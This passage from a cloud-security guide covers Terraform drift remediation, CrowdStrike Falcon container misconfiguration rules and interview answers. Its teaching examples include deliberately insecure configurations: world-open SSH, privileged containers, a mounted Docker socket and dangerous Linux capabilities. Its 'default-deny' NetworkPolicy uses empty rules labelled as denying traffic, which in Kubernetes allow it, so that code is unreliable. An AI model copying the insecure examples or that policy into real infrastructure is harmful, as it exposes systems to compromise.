☐ ONGOING MONITORING (Monthly)
   ├── Review IOM trends — are we improving?
   ├── Audit exception list — any expired?
   ├── Check for new CrowdStrike rule updates
   └── Report posture metrics to leadership
```

---

# PART 3: REMEDIATING MISCONFIGURATIONS & DRIFTS WITH TERRAFORM

---

## 3.1 Understanding Configuration Drift

```
WHAT IS DRIFT?
══════════════

Drift = When live cloud state ≠ what's defined in your Terraform code

HOW DRIFT HAPPENS:
├── 1. Console Cowboy: Engineer changes SG rule directly in AWS Console
├── 2. CLI Quick Fix: Someone runs `aws ec2 authorize-security-group-ingress` manually
├── 3. Another Tool: A different automation tool modifies the same resource
├── 4. Emergency Fix: Incident response team opens ports during an incident
└── 5. AWS Auto-Changes: Service updates, default changes, deprecations

WHY DRIFT IS A SECURITY RISK:
├── Terraform doesn't know about the manual change
├── Next `terraform apply` may OVERWRITE the change (or not — depends on state)
├── Manual changes bypass code review, PR approval, and security scanning
├── IOMs in Falcon fire on the drifted resource — but the IaC looks clean
└── Compliance auditors see different configs in IaC vs. live environment

DRIFT DETECTION CHAIN:
┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐
│ Terraform│    │Falcon    │    │ Security │    │  Fix in  │
│ State    │ →  │ CSPM     │ →  │ Analyst  │ →  │ Terraform│
│ (desired)│    │ (actual) │    │ (triage) │    │ (source) │
└──────────┘    └──────────┘    └──────────┘    └──────────┘
     ↕                ↕
  "SG allows       "SG allows
   10.0.0.0/8"     0.0.0.0/0"
                        ↑
                  DRIFT DETECTED!
```

## 3.2 Drift Detection Workflow

```
COMPLETE DRIFT DETECTION & REMEDIATION WORKFLOW
════════════════════════════════════════════════

STEP 1: FALCON DETECTS THE IOM
├── CrowdStrike Falcon CSPM scans the AWS account
├── Finds: Security Group sg-0abc123 allows 0.0.0.0/0 on port 22
├── Creates IOM: "Security Group allows unrestricted SSH access"
├── Severity: 🔴 CRITICAL
└── Notification sent via configured channel

STEP 2: ANALYST DETERMINES IF THIS IS DRIFT OR BAD IaC
├── Check 1: Look at resource tags
│   ├── Tag: terraform:workspace = "vpc-production"
│   ├── Tag: terraform:module = "security-groups"
│   └── This tells us: resource IS managed by Terraform
│
├── Check 2: Compare with Terraform code
│   ├── Open the relevant .tf file in the repo
│   ├── Find the resource: aws_security_group_rule.ssh_access
│   ├── Code says: cidr_blocks = ["10.0.0.0/8"]
│   └── Live says: cidr_blocks = ["0.0.0.0/0"]
│   ├── VERDICT: THIS IS DRIFT — someone changed it manually
│
├── Check 3: Find who made the change
│   ├── AWS CloudTrail → Filter: AuthorizeSecurityGroupIngress
│   ├── Resource: sg-0abc123
│   ├── User: arn:aws:iam::123456789012:user/john.doe
│   ├── Time: 2026-04-10 03:22:00 UTC (during incident response)
│   └── Source IP: 10.1.2.3 (corporate VPN)
│
└── VERDICT: John opened SSH during an incident and forgot to close it

STEP 3: FIX IN TERRAFORM (NOT IN CONSOLE!)
├── Option A: Run terraform plan → see drift → terraform apply to revert
├── Option B: Update Terraform code if the change was intentional
└── ⚠️ NEVER FIX DRIFT IN THE CONSOLE — it will drift again!
```

## 3.3 Terraform Drift Detection Commands

```bash
# ==================================================================
# TERRAFORM DRIFT DETECTION COMMANDS
# ==================================================================

# 1. DETECT DRIFT — See what changed vs. Terraform state
terraform plan -refresh-only
# Output shows resources that changed outside Terraform

# 2. DETAILED DRIFT REPORT
terraform plan -refresh-only -detailed-exitcode
# Exit codes:
#   0 = No changes
#   1 = Error
#   2 = Changes detected (DRIFT EXISTS!)

# 3. REFRESH STATE (Accept current live state into Terraform state)
# ⚠️ USE ONLY IF the manual change was INTENTIONAL and you want to KEEP it
terraform apply -refresh-only

# 4. REVERT DRIFT (Apply original Terraform config to overwrite manual changes)
terraform apply
# This will show the changes needed to bring live → match code
# Review carefully before approving!

# 5. TARGETED DRIFT CHECK (Single resource)
terraform plan -target=aws_security_group.main
# Only checks drift on the specified resource

# 6. IMPORT UNMANAGED RESOURCES
# If a resource was created manually and needs to be Terraform-managed:
terraform import aws_security_group.manually_created sg-0abc123
# Then write the corresponding .tf code to match the live config
```

## 3.4 Common Misconfiguration Remediations in Terraform

### Remediation 1: S3 Bucket Public Access (IOM: S3 Public)

```hcl
# ❌ MISCONFIGURATION — S3 bucket without public access block
resource "aws_s3_bucket" "data" {
  bucket = "my-app-data-bucket"
}

# ✅ REMEDIATION — Add public access block + encryption
resource "aws_s3_bucket" "data" {
  bucket = "my-app-data-bucket"
}

resource "aws_s3_bucket_public_access_block" "data" {
  bucket = aws_s3_bucket.data.id

  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

resource "aws_s3_bucket_server_side_encryption_configuration" "data" {
  bucket = aws_s3_bucket.data.id

  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm     = "aws:kms"
      kms_master_key_id = aws_kms_key.s3_key.arn
    }
    bucket_key_enabled = true
  }
}

resource "aws_s3_bucket_versioning" "data" {
  bucket = aws_s3_bucket.data.id
  versioning_configuration {
    status = "Enabled"
  }
}

resource "aws_s3_bucket_logging" "data" {
  bucket        = aws_s3_bucket.data.id
  target_bucket = aws_s3_bucket.access_logs.id
  target_prefix = "s3-access-logs/data-bucket/"
}
```

### Remediation 2: Security Group Open SSH (IOM: Open SG)

```hcl
# ❌ MISCONFIGURATION — SSH open to the world
resource "aws_security_group_rule" "ssh" {
  type              = "ingress"
  security_group_id = aws_security_group.app.id
  from_port         = 22
  to_port           = 22
  protocol          = "tcp"
  cidr_blocks       = ["0.0.0.0/0"]    # ← CRITICAL IOM
}

# ✅ REMEDIATION — Option A: Restrict to corporate CIDR
resource "aws_security_group_rule" "ssh" {
  type              = "ingress"
  security_group_id = aws_security_group.app.id
  from_port         = 22
  to_port           = 22
  protocol          = "tcp"
  cidr_blocks       = ["10.0.0.0/8"]    # Corporate network only
  description       = "SSH from corporate VPN only"
}

# ✅ REMEDIATION — Option B: Remove SSH entirely, use SSM
# (BETTER — no inbound ports needed at all)
# Delete the SSH security group rule entirely
# Add SSM IAM policy to instance role instead:

resource "aws_iam_role_policy_attachment" "ssm" {
  role       = aws_iam_role.instance_role.name
  policy_arn = "arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore"
}
```

### Remediation 3: RDS Publicly Accessible (IOM: Public Database)

```hcl
# ❌ MISCONFIGURATION
resource "aws_db_instance" "app_db" {
  identifier     = "app-database"
  engine         = "postgres"
  instance_class = "db.t3.medium"
  publicly_accessible = true           # ← CRITICAL IOM
  storage_encrypted   = false          # ← HIGH IOM
}

# ✅ REMEDIATION
resource "aws_db_instance" "app_db" {
  identifier          = "app-database"
  engine              = "postgres"
  instance_class      = "db.t3.medium"
  publicly_accessible = false                              # Fix 1: Private only
  storage_encrypted   = true                               # Fix 2: Encrypted
  kms_key_id          = aws_kms_key.rds_key.arn           # Fix 3: CMK
  db_subnet_group_name = aws_db_subnet_group.private.name # Fix 4: Private subnet
  
  # Additional security hardening
  deletion_protection = true
  backup_retention_period = 7
  multi_az            = true
  
  # Performance Insights (for monitoring)
  performance_insights_enabled    = true
  performance_insights_kms_key_id = aws_kms_key.rds_key.arn
}
```

### Remediation 4: IAM User with Access Keys (IOM: IAM Risk)

```hcl
# ❌ MISCONFIGURATION — IAM user with long-lived access keys
resource "aws_iam_user" "deploy_user" {
  name = "cicd-deploy-user"
}

resource "aws_iam_access_key" "deploy_key" {
  user = aws_iam_user.deploy_user.name
  # ← Long-lived credential — HIGH RISK
}

# ✅ REMEDIATION — Use OIDC federation for CI/CD
# Delete the IAM user and access keys
# Replace with OIDC provider for GitHub Actions:

resource "aws_iam_openid_connect_provider" "github" {
  url = "https://token.actions.githubusercontent.com"
  client_id_list = ["sts.amazonaws.com"]
  thumbprint_list = ["6938fd4d98bab03faadb97b34396831e3780aea1"]
}

resource "aws_iam_role" "github_actions" {
  name = "github-actions-deploy"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect = "Allow"
      Principal = {
        Federated = aws_iam_openid_connect_provider.github.arn
      }
      Action = "sts:AssumeRoleWithWebIdentity"
      Condition = {
        StringEquals = {
          "token.actions.githubusercontent.com:aud" = "sts.amazonaws.com"
        }
        StringLike = {
          "token.actions.githubusercontent.com:sub" = "repo:myorg/myrepo:ref:refs/heads/main"
        }
      }
    }]
  })
}
# Result: No long-lived credentials, scoped to specific repo/branch
```

### Remediation 5: EKS Public Endpoint (IOM: EKS Exposure)

```hcl
# ❌ MISCONFIGURATION
resource "aws_eks_cluster" "main" {
  name     = "prod-cluster"
  role_arn = aws_iam_role.eks.arn

  vpc_config {
    endpoint_private_access = false    # ← Can't access from VPC
    endpoint_public_access  = true     # ← Open to internet!
    public_access_cidrs     = ["0.0.0.0/0"]  # ← All IPs!
  }
}

# ✅ REMEDIATION
resource "aws_eks_cluster" "main" {
  name     = "prod-cluster"
  role_arn = aws_iam_role.eks.arn

  vpc_config {
    endpoint_private_access = true                  # Fix 1: VPC access
    endpoint_public_access  = true                  # Still needed for kubectl
    public_access_cidrs     = [                     # Fix 2: Restrict CIDRs
      "10.0.0.0/8",                                 # Corporate network
      "203.0.113.50/32"                             # VPN exit IP
    ]
    subnet_ids              = var.private_subnet_ids # Fix 3: Private subnets
    security_group_ids      = [aws_security_group.eks_cluster.id]
  }

  # Fix 4: Enable control plane logging
  enabled_cluster_log_types = [
    "api", "audit", "authenticator", "controllerManager", "scheduler"
  ]

  # Fix 5: Encryption
  encryption_config {
    provider {
      key_arn = aws_kms_key.eks.arn
    }
    resources = ["secrets"]
  }
}
```

## 3.5 Automated Drift Prevention Pipeline

```yaml
# ==================================================================
# CI/CD PIPELINE — PREVENT DRIFT & MISCONFIGURATIONS
# ==================================================================
# .github/workflows/terraform-security.yml

name: Terraform Security Pipeline

on:
  pull_request:
    paths:
      - 'terraform/**'

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      # Step 1: IaC Security Scanning (Pre-Deploy)
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Run Checkov IaC Scan
        uses: bridgecrewio/checkov-action@v12
        with:
          directory: terraform/
          framework: terraform
          output_format: junitxml
          soft_fail: false          # FAIL the build on violations
          skip_check: ""            # No skips by default
          check: >
            CKV_AWS_145,CKV_AWS_24,CKV_AWS_18,CKV_AWS_19,
            CKV_AWS_23,CKV_AWS_79,CKV_AWS_130,CKV_K8S_1,
            CKV_K8S_8,CKV_K8S_20

      # Step 2: Terraform Plan (Detect Drift)
      - name: Terraform Init
        run: terraform init -backend-config=backend.hcl
        working-directory: terraform/

      - name: Terraform Plan
        run: terraform plan -out=plan.tfplan -detailed-exitcode
        working-directory: terraform/
        continue-on-error: true

      # Step 3: Drift Alert
      - name: Alert on Drift
        if: steps.plan.outputs.exitcode == 2
        run: |
          echo "⚠️ DRIFT DETECTED — Live infrastructure differs from code!"
          echo "Review the plan output and verify changes are intentional."
          # Send Slack notification
          curl -X POST ${{ secrets.SLACK_WEBHOOK }} \
            -d '{"text":"🚨 Terraform Drift Detected in production!"}'

      # Step 4: CrowdStrike Falcon IaC Scan (Optional — if using Falcon IaC)
      - name: Falcon IaC Scan
        uses: crowdstrike/falcon-iac-scan@v1
        with:
          falcon_client_id: ${{ secrets.FALCON_CLIENT_ID }}
          falcon_client_secret: ${{ secrets.FALCON_CLIENT_SECRET }}
          path: terraform/
          fail_on: high    # Fail on HIGH and CRITICAL
```

---

# PART 4: 5 TERRAFORM-BASED IOM RULES FOR CONTAINER SECURITY

---

> **Context:** These 5 Terraform configurations define IOM rules that detect
> container security misconfigurations. Each includes the insecure config,
> the Falcon IOM that triggers, and the Terraform remediation.

## IOM Rule 1: Privileged Container Detection

```
┌─────────────────────────────────────────────────────────────┐
│  IOM RULE #1: PRIVILEGED CONTAINER DETECTED                  │
├─────────────────────────────────────────────────────────────┤
│  SEVERITY:     🔴 CRITICAL                                   │
│  CIS BENCHMARK: CIS Kubernetes 5.2.1                         │
│  MITRE ATT&CK:  T1611 (Escape to Host)                      │
│  FALCON RULE:   "Container running with privileged flag"     │
│  RISK:          Container has FULL host kernel access         │
│                 — attacker can escape to node                │
└─────────────────────────────────────────────────────────────┘
```

```hcl
# ==================================================================
# IOM #1: PRIVILEGED CONTAINER — TERRAFORM (KAC Policy)
# ==================================================================

# --- CrowdStrike KAC Policy: Block Privileged Containers ---
resource "crowdstrike_cloud_security_kac_policy" "block_privileged" {
  name        = "Block Privileged Containers — Production"
  description = "Prevents deployment of containers with privileged: true"
  enabled     = true

  rule_groups {
    name   = "privileged-container-block"
    action = "prevent"  # Block deployment (use "alert" for monitoring phase)
    
    rules {
      privileged_container = "enabled"
    }
  }

  # Assign to production clusters only
  cluster_groups = ["production-eks-clusters"]
  
  # Exceptions for system components
  exceptions {
    namespace = "kube-system"
    reason    = "CNI plugins require privileged for network setup"
  }
  exceptions {
    namespace = "falcon-system"
    reason    = "Falcon sensor DaemonSet requires privileged for monitoring"
  }
}

# --- Terraform Configuration That TRIGGERS This IOM ---
# This Kubernetes deployment will be BLOCKED by the KAC policy above

resource "kubernetes_deployment" "insecure_app" {
  metadata {
    name      = "payment-api"
    namespace = "payments"
  }
  spec {
    replicas = 2
    selector {
      match_labels = { app = "payment-api" }
    }
    template {
      metadata {
        labels = { app = "payment-api" }
      }
      spec {
        container {
          name  = "payment-api"
          image = "123456.dkr.ecr.us-east-1.amazonaws.com/payment-api:v2.1"
          
          security_context {
            privileged = true   # ← THIS TRIGGERS IOM #1
            # Falcon KAC intercepts this → DEPLOYMENT REJECTED
          }
        }
      }
    }
  }
}

# --- REMEDIATED Terraform (Passes IOM Check) ---
resource "kubernetes_deployment" "secure_app" {
  metadata {
    name      = "payment-api"
    namespace = "payments"
  }
  spec {
    replicas = 2
    selector {
      match_labels = { app = "payment-api" }
    }
    template {
      metadata {
        labels = { app = "payment-api" }
      }
      spec {
        container {
          name  = "payment-api"
          image = "123456.dkr.ecr.us-east-1.amazonaws.com/payment-api:v2.1"
          
          security_context {
            privileged                 = false    # ✅ Not privileged
            run_as_non_root            = true     # ✅ Non-root user
            read_only_root_filesystem  = true     # ✅ Read-only fs
            allow_privilege_escalation = false     # ✅ No escalation
            
            capabilities {
              drop = ["ALL"]                      # ✅ Drop all caps
              add  = ["NET_BIND_SERVICE"]         # ✅ Only what's needed
            }
          }
        }
      }
    }
  }
}
```

## IOM Rule 2: Container Running as Root User

```
┌─────────────────────────────────────────────────────────────┐
│  IOM RULE #2: CONTAINER RUNNING AS ROOT                      │
├─────────────────────────────────────────────────────────────┤
│  SEVERITY:     🟠 HIGH                                       │
│  CIS BENCHMARK: CIS Kubernetes 5.2.6                         │
│  MITRE ATT&CK:  T1078 (Valid Accounts — Default Accounts)   │
│  FALCON RULE:   "Container process running as UID 0"        │
│  RISK:          Root in container = easier escape,           │
│                 mount host paths, access secrets             │
└─────────────────────────────────────────────────────────────┘
```

```hcl
# ==================================================================
# IOM #2: ROOT USER IN CONTAINER — TERRAFORM (KAC Policy)
# ==================================================================

resource "crowdstrike_cloud_security_kac_policy" "block_root_user" {
  name        = "Enforce Non-Root Containers — All Clusters"
  description = "Blocks containers that run as root (UID 0)"
  enabled     = true

  rule_groups {
    name   = "root-user-block"
    action = "prevent"
    
    rules {
      run_as_root_user = "enabled"
    }
  }

  cluster_groups = ["all-eks-clusters"]
  
  exceptions {
    namespace = "kube-system"
    reason    = "CoreDNS and kube-proxy require root for port binding"
  }
}

# --- Terraform That TRIGGERS This IOM ---
resource "kubernetes_deployment" "root_app" {
  metadata {
    name      = "data-processor"
    namespace = "analytics"
  }
  spec {
    replicas = 3
    selector {
      match_labels = { app = "data-processor" }
    }
    template {
      metadata {
        labels = { app = "data-processor" }
      }
      spec {
        container {
          name  = "processor"
          image = "123456.dkr.ecr.us-east-1.amazonaws.com/data-processor:v1.5"
          
          # ❌ NO securityContext defined
          # → Container runs as whatever USER is in Dockerfile
          # → If Dockerfile has no USER instruction → runs as ROOT
          # → THIS TRIGGERS IOM #2
        }
      }
    }
  }
}

# --- REMEDIATED Terraform ---
resource "kubernetes_deployment" "secure_root_app" {
  metadata {
    name      = "data-processor"
    namespace = "analytics"
  }
  spec {
    replicas = 3
    selector {
      match_labels = { app = "data-processor" }
    }
    template {
      metadata {
        labels = { app = "data-processor" }
      }
      spec {
        security_context {
          run_as_non_root = true       # ✅ Pod-level: enforce non-root
          run_as_user     = 1000       # ✅ Explicit non-root UID
          run_as_group    = 1000       # ✅ Explicit non-root GID
          fs_group        = 1000       # ✅ Volume ownership
          
          seccomp_profile {
            type = "RuntimeDefault"    # ✅ Default seccomp profile
          }
        }

        container {
          name  = "processor"
          image = "123456.dkr.ecr.us-east-1.amazonaws.com/data-processor:v1.5"
          
          security_context {
            run_as_non_root            = true
            read_only_root_filesystem  = true
            allow_privilege_escalation = false
            capabilities {
              drop = ["ALL"]
            }
          }
          
          # Writable directories via volumes only
          volume_mount {
            name       = "tmp"
            mount_path = "/tmp"
          }
        }
        
        volume {
          name = "tmp"
          empty_dir {}  # Ephemeral writable volume
        }
      }
    }
  }
}
```

## IOM Rule 3: Host Docker Socket Mounted in Container

```
┌─────────────────────────────────────────────────────────────┐
│  IOM RULE #3: DOCKER SOCKET MOUNTED IN CONTAINER             │
├─────────────────────────────────────────────────────────────┤
│  SEVERITY:     🔴 CRITICAL                                   │
│  CIS BENCHMARK: CIS Docker 5.31                              │
│  MITRE ATT&CK:  T1610 (Deploy Container via API)            │
│  FALCON RULE:   "Container mounting host runtime socket"     │
│  RISK:          Pod with docker.sock can spawn new           │
│                 privileged containers on the host            │
│                 — equivalent to full host compromise         │
└─────────────────────────────────────────────────────────────┘
```

```hcl
# ==================================================================
# IOM #3: DOCKER SOCKET MOUNT — TERRAFORM (KAC Policy)
# ==================================================================

resource "crowdstrike_cloud_security_kac_policy" "block_docker_socket" {
  name        = "Block Docker Socket Mount — All Environments"
  description = "Prevents containers from mounting /var/run/docker.sock"
  enabled     = true

  rule_groups {
    name   = "docker-socket-block"
    action = "prevent"
    
    rules {
      runtime_socket_in_container = "enabled"
    }
  }

  cluster_groups = ["all-eks-clusters"]
  
  # NO exceptions — docker socket mount should NEVER be allowed
  # If CI/CD runners need container builds, use Kaniko or buildah instead
}

# --- Terraform That TRIGGERS This IOM ---
resource "kubernetes_deployment" "cicd_runner" {
  metadata {
    name      = "jenkins-agent"
    namespace = "ci-cd"
  }
  spec {
    replicas = 2
    selector {
      match_labels = { app = "jenkins-agent" }
    }
    template {
      metadata {
        labels = { app = "jenkins-agent" }
      }
      spec {
        container {
          name  = "jenkins-agent"
          image = "jenkins/inbound-agent:latest"
          
          volume_mount {
            name       = "docker-sock"
            mount_path = "/var/run/docker.sock"   # ← TRIGGERS IOM #3
          }
        }
        
        volume {
          name = "docker-sock"
          host_path {
            path = "/var/run/docker.sock"          # ← CRITICAL: Host socket!
            type = "Socket"
          }
        }
      }
    }
  }
}

# --- REMEDIATED Terraform (Use Kaniko for in-cluster builds) ---
resource "kubernetes_deployment" "secure_cicd_runner" {
  metadata {
    name      = "jenkins-agent"
    namespace = "ci-cd"
  }
  spec {
    replicas = 2
    selector {
      match_labels = { app = "jenkins-agent" }
    }
    template {
      metadata {
        labels = { app = "jenkins-agent" }
      }
      spec {
        service_account_name = "jenkins-agent-sa"
        
        container {
          name  = "jenkins-agent"
          image = "jenkins/inbound-agent:4.11.2"   # ✅ Pinned version
          
          security_context {
            run_as_non_root            = true
            read_only_root_filesystem  = true
            allow_privilege_escalation = false
            capabilities {
              drop = ["ALL"]
            }
          }
          # ✅ NO docker.sock mount
          # Use Kaniko sidecar for container builds instead
        }
        
        # Kaniko sidecar for building images without Docker daemon
        container {
          name  = "kaniko"
          image = "gcr.io/kaniko-project/executor:v1.22.0"
          
          args = [
            "--dockerfile=Dockerfile",
            "--context=dir:///workspace",
            "--destination=123456.dkr.ecr.us-east-1.amazonaws.com/app:latest",
            "--cache=true"
          ]
          
          volume_mount {
            name       = "workspace"
            mount_path = "/workspace"
          }
          volume_mount {
            name       = "docker-config"
            mount_path = "/kaniko/.docker"
          }
        }
        
        volume {
          name = "workspace"
          empty_dir {}  # ✅ No host paths
        }
        volume {
          name = "docker-config"
          secret {
            secret_name = "ecr-registry-credentials"
          }
        }
      }
    }
  }
}
```

## IOM Rule 4: Container with Dangerous Linux Capabilities

```
┌─────────────────────────────────────────────────────────────┐
│  IOM RULE #4: DANGEROUS LINUX CAPABILITIES GRANTED           │
├─────────────────────────────────────────────────────────────┤
│  SEVERITY:     🟠 HIGH                                       │
│  CIS BENCHMARK: CIS Kubernetes 5.2.8, 5.2.9                 │
│  MITRE ATT&CK:  T1611 (Escape to Host), T1068 (Exploitation │
│                  for Privilege Escalation)                    │
│  FALCON RULE:   "Container granted SYS_ADMIN/NET_RAW/etc."  │
│  RISK:          SYS_ADMIN = near-privileged access           │
│                 NET_RAW = network sniffing/spoofing           │
│                 SYS_PTRACE = process injection                │
└─────────────────────────────────────────────────────────────┘
```

```hcl
# ==================================================================
# IOM #4: DANGEROUS CAPABILITIES — TERRAFORM (KAC Policy)
# ==================================================================

resource "crowdstrike_cloud_security_kac_policy" "block_dangerous_caps" {
  name        = "Block Dangerous Linux Capabilities — Production"
  description = "Prevents containers from adding SYS_ADMIN, NET_RAW, SYS_PTRACE"
  enabled     = true

  rule_groups {
    name   = "dangerous-capabilities-block"
    action = "prevent"
    
    rules {
      container_with_sysadmin_capability  = "enabled"
      container_with_net_raw_capability   = "enabled"
      container_with_sys_ptrace_capability = "enabled"
    }
  }

  cluster_groups = ["production-eks-clusters"]

  exceptions {
    namespace = "falcon-system"
    reason    = "Falcon sensor requires SYS_PTRACE for process inspection"
  }
  exceptions {
    namespace = "monitoring"
    image     = "calico/node:*"
    reason    = "Calico CNI requires NET_RAW for network policy enforcement"
  }
}

# --- Terraform That TRIGGERS This IOM ---
resource "kubernetes_deployment" "debug_tool" {
  metadata {
    name      = "network-debugger"
    namespace = "platform"
  }
  spec {
    replicas = 1
    selector {
      match_labels = { app = "network-debugger" }
    }
    template {
      metadata {
        labels = { app = "network-debugger" }
      }
      spec {
        container {
          name  = "debugger"
          image = "nicolaka/netshoot:latest"
          
          security_context {
            capabilities {
              add = [
                "SYS_ADMIN",    # ← TRIGGERS IOM #4 (near-privileged)
                "NET_RAW",      # ← TRIGGERS IOM #4 (packet sniffing)
                "SYS_PTRACE",   # ← TRIGGERS IOM #4 (process injection)
                "NET_ADMIN"     # ← Additional risk
              ]
            }
          }
        }
      }
    }
  }
}

# --- REMEDIATED Terraform ---
resource "kubernetes_deployment" "secure_debug_tool" {
  metadata {
    name      = "network-debugger"
    namespace = "platform"
    labels = {
      "app.kubernetes.io/name" = "network-debugger"
      "security-review"        = "approved-2026-04"
    }
  }
  spec {
    replicas = 1
    selector {
      match_labels = { app = "network-debugger" }
    }
    template {
      metadata {
        labels = { app = "network-debugger" }
      }
      spec {
        # Pod-level security context
        security_context {
          run_as_non_root = true
          run_as_user     = 65534   # nobody user
          seccomp_profile {
            type = "RuntimeDefault"
          }
        }
        
        container {
          name  = "debugger"
          image = "123456.dkr.ecr.us-east-1.amazonaws.com/netshoot:v0.12"  # ✅ Private registry
          
          security_context {
            allow_privilege_escalation = false
            read_only_root_filesystem  = true
            capabilities {
              drop = ["ALL"]                # ✅ Drop everything
              add  = ["NET_BIND_SERVICE"]   # ✅ Only what's actually needed
            }
          }
        }
        
        # If the tool needs temporary storage
        volume {
          name = "tmp"
          empty_dir {
            size_limit = "100Mi"
          }
        }
      }
    }
  }
}
```

## IOM Rule 5: Container Without Network Policy Enforcement

```
┌─────────────────────────────────────────────────────────────┐
│  IOM RULE #5: NO NETWORK POLICY IN NAMESPACE                 │
├─────────────────────────────────────────────────────────────┤
│  SEVERITY:     🟠 HIGH                                       │
│  CIS BENCHMARK: CIS Kubernetes 5.3.2                         │
│  MITRE ATT&CK:  T1021 (Lateral Movement via Remote Services)│
│  FALCON RULE:   "Namespace has no NetworkPolicy defined"     │
│  RISK:          Without NetworkPolicy, ANY pod can talk to   │
│                 ANY other pod — lateral movement is trivial  │
│                 Attacker compromises one pod → moves to ALL  │
└─────────────────────────────────────────────────────────────┘
```

```hcl
# ==================================================================
# IOM #5: MISSING NETWORK POLICY — TERRAFORM
# ==================================================================

# This IOM is detected by Falcon CSPM's Kubernetes assessment,
# not KAC admission control (since NetworkPolicy is not a pod-level setting).
# The remediation is to deploy NetworkPolicies via Terraform.

# --- Checking for this IOM in Falcon ---
# Cloud Security → Configuration Assessment → Kubernetes
# Finding: "Namespace 'payments' has no NetworkPolicy"
# Severity: HIGH
# Recommendation: "Deploy a default-deny NetworkPolicy and then 
#                  add allow rules for required traffic"

# --- REMEDIATION: Deploy Default-Deny + Allowlist ---

# STEP 1: Default-Deny All Traffic in Namespace
resource "kubernetes_network_policy" "default_deny_all" {
  metadata {
    name      = "default-deny-all"
    namespace = "payments"
  }

  spec {
    pod_selector {}   # Empty = applies to ALL pods in namespace

    # Deny ALL ingress
    ingress {}

    # Deny ALL egress
    egress {}

    policy_types = ["Ingress", "Egress"]
  }
}

# STEP 2: Allow Specific Traffic — API to Database
resource "kubernetes_network_policy" "allow_api_to_db" {
  metadata {
    name      = "allow-api-to-database"
    namespace = "payments"
  }

  spec {
    pod_selector {
      match_labels = { app = "payment-api" }   # Source: API pods
    }

    # Allow egress TO database pods on port 5432
    egress {
      to {
        pod_selector {
          match_labels = { app = "payment-db" }  # Destination: DB pods
        }
      }
      ports {
        port     = "5432"
        protocol = "TCP"
      }
    }

    # Allow egress TO DNS (required for service discovery)
    egress {
      to {
        namespace_selector {
          match_labels = { name = "kube-system" }
        }
      }
      ports {
        port     = "53"
        protocol = "UDP"
      }
      ports {
        port     = "53"
        protocol = "TCP"
      }
    }

    policy_types = ["Egress"]
  }
}

# STEP 3: Allow Ingress from Load Balancer to API
resource "kubernetes_network_policy" "allow_lb_to_api" {
  metadata {
    name      = "allow-ingress-to-api"
    namespace = "payments"
  }

  spec {
    pod_selector {
      match_labels = { app = "payment-api" }
    }

    # Allow ingress FROM ingress controller namespace
    ingress {
      from {
        namespace_selector {
          match_labels = { name = "ingress-nginx" }
        }
      }
      ports {
        port     = "8080"
        protocol = "TCP"
      }
    }

    policy_types = ["Ingress"]
  }
}

# STEP 4: Allow Falcon Sensor Communication
resource "kubernetes_network_policy" "allow_falcon" {
  metadata {
    name      = "allow-falcon-sensor"
    namespace = "payments"
  }

  spec {
    pod_selector {}     # All pods need Falcon connectivity

    # Allow egress to Falcon cloud
    egress {
      ports {
        port     = "443"
        protocol = "TCP"
      }
    }

    policy_types = ["Egress"]
  }
}
```

## Summary: All 5 Container Security IOM Rules

```
┌────┬──────────────────────────┬──────────┬─────────────────────────────────┐
│ #  │ IOM Rule                 │ Severity │ Terraform Resource              │
├────┼──────────────────────────┼──────────┼─────────────────────────────────┤
│ 1  │ Privileged Container     │ CRITICAL │ crowdstrike_kac_policy          │
│    │                          │          │ + kubernetes_deployment         │
├────┼──────────────────────────┼──────────┼─────────────────────────────────┤
│ 2  │ Root User in Container   │ HIGH     │ crowdstrike_kac_policy          │
│    │                          │          │ + kubernetes_deployment         │
├────┼──────────────────────────┼──────────┼─────────────────────────────────┤
│ 3  │ Docker Socket Mount      │ CRITICAL │ crowdstrike_kac_policy          │
│    │                          │          │ + kubernetes_deployment         │
├────┼──────────────────────────┼──────────┼─────────────────────────────────┤
│ 4  │ Dangerous Capabilities   │ HIGH     │ crowdstrike_kac_policy          │
│    │ (SYS_ADMIN/NET_RAW)      │          │ + kubernetes_deployment         │
├────┼──────────────────────────┼──────────┼─────────────────────────────────┤
│ 5  │ No NetworkPolicy in NS   │ HIGH     │ kubernetes_network_policy       │
│    │                          │          │ (default-deny + allowlist)      │
└────┴──────────────────────────┴──────────┴─────────────────────────────────┘
```

---

# PART 5: INTERVIEW QUESTIONS & ANSWERS

---

## Section A: IOM Policies & Rules (8 Questions)

---

### Q1. "What is an IOM in CrowdStrike Falcon, and how does it differ from an IOA?"

**Answer:**

> "An **IOM (Indicator of Misconfiguration)** is a static, configuration-based detection in CrowdStrike Falcon Cloud Security that identifies insecure settings in cloud resources. It checks the *configuration state* — like 'is this S3 bucket public?' or 'does this pod run as root?'
>
> An **IOA (Indicator of Attack)** is a behavioral, runtime-based detection that identifies suspicious *actions* — like 'a new executable appeared in a running container' (drift) or 'a process opened a reverse shell.'
>
> **Key differences:**
> - **IOM = What IS configured wrong** → Fix the configuration
> - **IOA = What IS happening right now** → Kill the process, investigate
> - IOMs fire during periodic scans or at deployment (via KAC)
> - IOAs fire in real-time during container execution
> - IOMs are typically remediated via Terraform/IaC fixes
> - IOAs are typically responded to via IR playbooks
>
> **Example in practice:** An IOM flags 'this pod runs as privileged' (before or during deployment). An IOA fires when 'a privileged pod just executed nsenter to escape to the host' (during runtime). The IOM could have *prevented* the IOA if we had enforced the KAC policy."

---

### Q2. "How do you write a custom IOM policy in CrowdStrike Falcon?"

**Answer:**

> "There are three methods to create IOM policies in Falcon:
>
> **Method 1: Customize Built-In Policies**
> Navigate to Cloud Security → Configuration Assessment → Policies. Select a built-in rule (e.g., 'S3 bucket public'), change its severity from HIGH to CRITICAL for your compliance needs, and enable/disable rules per your environment. This is the quickest approach.
>
> **Method 2: Clone and Modify**
> If you need a stricter version of an existing rule — for example, enforcing CMK encryption instead of just requiring encryption on/off — clone the built-in rule, modify the check logic, add your compliance mappings, and assign a descriptive name.
>
> **Method 3: Create from Scratch**
> For organization-specific rules that don't have built-in equivalents — like mandatory tagging policies — create a new custom policy. Define the cloud provider, service, check logic, severity, and compliance framework mapping.
>
> **Best practices I follow:**
> - Start with clones of existing policies (proven logic, less error-prone)
> - Always map to compliance frameworks (CIS, PCI, SOX, NIST)
